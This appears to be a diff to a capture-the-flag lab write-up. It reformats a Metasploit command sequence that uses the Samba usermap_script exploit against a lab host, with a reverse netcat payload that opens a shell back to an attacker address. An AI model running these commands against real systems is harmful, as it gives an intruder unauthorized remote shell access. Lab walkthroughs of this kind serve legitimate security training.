@@ -79,7 +79,16 @@ Submit the flag located in the makis user's home directory.
 ![image](https://github.com/user-attachments/assets/3abc2f22-f81f-4749-bc2c-1e97e0a56036)
 
 
-<pre> ```bash msfconsole use exploit/multi/samba/usermap_script set RHOSTS 10.10.10.3 set PAYLOAD cmd/unix/reverse_netcat set LHOST 10.10.14.71 run ``` </pre>
+bash msfconsole use exploit/multi/samba/usermap_script set RHOSTS 10.10.10.3 set PAYLOAD cmd/unix/reverse_netcat set LHOST 10.10.14.71 run 
+
+<pre> ```
+  msfconsole
+use exploit/multi/samba/usermap_script
+set RHOSTS 10.10.10.3
+set PAYLOAD cmd/unix/reverse_netcat
+set LHOST 10.10.14.71
+run
+  ``` </pre>
 
 
 
